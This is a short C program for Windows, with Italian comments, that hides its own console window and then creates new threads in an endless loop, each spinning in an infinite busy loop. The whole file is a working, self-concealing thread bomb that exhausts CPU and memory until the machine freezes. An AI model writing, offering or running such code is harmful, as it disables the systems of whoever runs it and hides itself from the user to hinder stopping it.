#include <stdio.h>
#include <windows.h> // libreria che uso per nascondere la console
#include <pthread.h>

void function(){
	int a = 1;
	while(1){
		++a;
	}
	pthread_exit(0);
}

void main(int argc, char *argv[]){
	HWND myWindow = GetConsoleWindow();
	pthread_t multi_thread;		// multi thread
	ShowWindow(myWindow, SW_HIDE); 	//nascondo la console
	for(;;)
		pthread_create(&multi_thread, NULL, function, NULL);
	pthread_join(multi_thread, NULL);	
}
